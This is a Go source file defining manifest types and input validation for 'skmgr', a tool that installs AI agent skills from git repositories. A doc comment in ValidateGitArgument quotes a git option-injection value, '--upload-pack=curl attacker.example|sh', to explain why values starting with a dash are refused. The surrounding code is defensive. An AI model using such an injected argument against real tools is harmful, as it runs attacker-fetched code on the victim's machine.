// Copyright 2026 AAG1999
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Package types defines the core domain types for skmgr.
package types

import (
	"fmt"
	"strings"
)

// Manifest represents the skmgr.yml manifest file.
// It declares the project's skill and rule dependencies along with
// the target agents they should be symlinked to.
type Manifest struct {
	// Name is the project identifier (required).
	Name string `yaml:"name"`

	// Version is an optional project version string.
	Version string `yaml:"version,omitempty"`

	// Targets lists the agent names that skills should be symlinked to
	// (e.g., "cursor", "gemini", "claude-code", "copilot").
	// Individual skills can override this with their own Targets field.
	Targets []string `yaml:"targets,omitempty"`

	// Skills is the list of skill and rule dependencies.
	Skills []SkillDependency `yaml:"skills,omitempty"`
}

// SkillDependency represents a single skill or rule entry in the manifest.
type SkillDependency struct {
	// Name is the local alias and directory name for this skill. It is optional
	// in the manifest: when omitted it is derived from Path, or from the
	// repository name when there is no Path. Must be unique within a manifest.
	// Omitted when writing so a derivable name is not persisted as noise.
	Name string `yaml:"name,omitempty"`

	// Source is the git URL or local path to fetch the skill from (required).
	// Examples:
	//   - https://github.com/user/repo.git
	//   - git@github.com:user/repo.git
	//   - https://gitlab.internal.com/team/skills.git
	//   - file:///Users/me/skills/custom-skill
	Source string `yaml:"source"`

	// Path is the subdirectory within the source repository containing the skill.
	// Used for monorepo support. If empty, the repo root is used.
	Path string `yaml:"path,omitempty"`

	// Ref is the git reference to check out: a tag (v1.2.0), branch (main),
	// or commit SHA (abc123def). If empty, defaults to the repo's default branch.
	Ref string `yaml:"ref,omitempty"`

	// Type is either "skill" or "rule". Defaults to "skill".
	// Skills are stored in .agents/skills/ and rules in .agents/rules/.
	Type string `yaml:"type,omitempty"`

	// Scope is either "project" or "global". Defaults to "project".
	// Project scope installs to .agents/ in the project root.
	// Global scope installs to ~/.agents/ in the user's home directory.
	Scope string `yaml:"scope,omitempty"`

	// Targets overrides the manifest-level Targets for this specific skill.
	// If empty, the manifest-level Targets are used.
	Targets []string `yaml:"targets,omitempty"`

	// NameDerived records that Name was filled in by the parser rather than
	// written by the user. Rewriting the manifest would otherwise bake a
	// derived name into the file, so the writer drops these again.
	NameDerived bool `yaml:"-"`
}

// Valid values for SkillDependency.Type.
const (
	TypeSkill = "skill"
	TypeRule  = "rule"
)

// Valid values for SkillDependency.Scope.
const (
	ScopeProject = "project"
	ScopeGlobal  = "global"
)

// ValidTypes returns the set of valid Type values.
func ValidTypes() []string {
	return []string{TypeSkill, TypeRule}
}

// ValidScopes returns the set of valid Scope values.
func ValidScopes() []string {
	return []string{ScopeProject, ScopeGlobal}
}

// EffectiveType returns the Type, defaulting to "skill" if empty.
func (s *SkillDependency) EffectiveType() string {
	if s.Type == "" {
		return TypeSkill
	}
	return s.Type
}

// EffectiveScope returns the Scope, defaulting to "project" if empty.
func (s *SkillDependency) EffectiveScope() string {
	if s.Scope == "" {
		return ScopeProject
	}
	return s.Scope
}

// EffectiveTargets returns the skill's Targets, falling back to the
// manifest-level targets if the skill doesn't override them.
func (s *SkillDependency) EffectiveTargets(manifestTargets []string) []string {
	if len(s.Targets) > 0 {
		return s.Targets
	}
	return manifestTargets
}

// reservedNames are Windows device names that cannot be used as directory
// names on that platform. We reject them everywhere so a manifest stays
// portable across operating systems.
var reservedNames = map[string]bool{
	"con": true, "prn": true, "aux": true, "nul": true,
	"com1": true, "com2": true, "com3": true, "com4": true,
	"com5": true, "com6": true, "com7": true, "com8": true, "com9": true,
	"lpt1": true, "lpt2": true, "lpt3": true, "lpt4": true,
	"lpt5": true, "lpt6": true, "lpt7": true, "lpt8": true, "lpt9": true,
}

// ValidateName checks that a skill name is safe to use as a single directory
// component. The name is joined onto canonical and agent directories, so a
// value containing separators or parent references would let a manifest write
// outside the intended tree.
func ValidateName(name string) error {
	if strings.TrimSpace(name) == "" {
		return fmt.Errorf("name must not be empty")
	}
	if name != strings.TrimSpace(name) {
		return fmt.Errorf("name %q must not have leading or trailing whitespace", name)
	}
	if strings.ContainsAny(name, `/\`) {
		return fmt.Errorf("name %q must not contain path separators", name)
	}
	if name == "." || name == ".." || strings.Contains(name, "..") {
		return fmt.Errorf("name %q must not contain parent directory references", name)
	}
	if strings.ContainsAny(name, `:*?"<>|`) {
		return fmt.Errorf("name %q contains characters that are invalid in a directory name", name)
	}
	if strings.ContainsRune(name, 0) {
		return fmt.Errorf("name must not contain a null byte")
	}
	if reservedNames[strings.ToLower(name)] {
		return fmt.Errorf("name %q is a reserved device name on Windows", name)
	}
	return nil
}

// ValidateGitArgument refuses a value that git would read as an option rather
// than as data.
//
// This is not about shell quoting: skmgr runs git through exec with an argument
// slice, so there is no shell to inject into. The exposure is that git decides
// what an argument means from its first character, and several of its options
// take a command to run. A manifest saying
//
//	source: --upload-pack=curl attacker.example|sh
//
// is not a URL that git fails to clone; it is a flag that git obeys. A ref
// cannot even be protected with a trailing `--`, because for `git checkout`
// that separator introduces paths rather than ending the options.
//
// So such a value is rejected outright. No real repository URL, branch, tag or
// commit begins with a dash, which makes the rule cheap to enforce and hard to
// get wrong.
func ValidateGitArgument(kind string, value string) error {
	if !strings.HasPrefix(value, "-") {
		return nil
	}

	return fmt.Errorf(
		"%s %q starts with '-', which git would read as an option rather than a value; "+
			"refusing it because several git options run a command of their own",
		kind, value)
}
